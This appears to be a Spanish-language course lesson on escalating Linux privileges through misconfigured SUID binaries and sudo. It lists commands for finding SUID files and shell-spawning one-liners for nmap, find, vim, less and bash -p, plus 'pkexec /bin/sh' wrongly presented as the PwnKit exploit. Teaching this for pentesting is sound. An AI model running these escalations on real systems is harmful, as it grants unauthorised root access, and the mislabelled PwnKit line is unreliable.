Abusando de privilegio SUID para migrar de usuario

Duración: 2:33 · Sección 2: Temario

El bit SUID (Set User ID) es un permiso especial de Linux que permite ejecutar un binario con los privilegios del propietario del archivo en lugar del usuario que lo ejecuta. Cuando está mal configurado, es una puerta abierta a la escalada de privilegios.

Que es el bit SUID

Cuando un binario tiene el bit SUID activado, se ejecuta con el UID del propietario. Se identifica con una s en la posicion del ejecutable del propietario (-rwsr-xr-x).

# Buscar binarios SUID en el sistema
find / -perm -4000 -type f 2>/dev/null

# Identificar el bit SUID en ls -la
ls -la /usr/bin/su
# -rwsr-xr-x 1 root root 44736 ...  La 's' indica SUID

# Tambien SGID (bit 2000)
find / -perm -2000 -type f 2>/dev/null
Permisos especiales: chmod 4755 asigna SUID (4), 2755 asigna SGID (2), 6755 asigna ambos. El bit SUID en un binario propiedad de root permite a cualquier usuario ejecutarlo con privilegios de root.

GTFOBins: El catalogo de abusos

GTFOBins es un repositorio que documenta como abusar de binarios SUID para escalar privilegios. Cada binario tiene tecnicas especificas.

# Ejemplo con nmap (versiones antiguas con --interactive)
nmap --interactive
nmap> !sh

# Ejemplo con find
find . -exec /bin/sh \; -quit

# Ejemplo con vim
vim -c ':!/bin/sh'

# Ejemplo con less/more
less /etc/passwd
# Desde less: !/bin/sh

pkexec y sudo como vectores

Incluso binarios legitimos como pkexec (PolicyKit) han tenido vulnerabilidades SUID famosas como CVE-2021-4034 (PwnKit).

# Verificar si tenemos permisos sudo
sudo -l

# Abusar de sudo -u para ejecutar como otro usuario
sudo -u root /bin/bash

# pkexec vulnerable (CVE-2021-4034)
pkexec /bin/sh

# Tecnica con bash -p (preservar privilegios)
bash -p
Aviso legal: Las tecnicas de escalada de privilegios mostradas aqui deben usarse exclusivamente en entornos controlados (laboratorios, CTFs, maquinas propias) o con autorizacion explicita por escrito del propietario del sistema. El uso no autorizado constituye un delito.
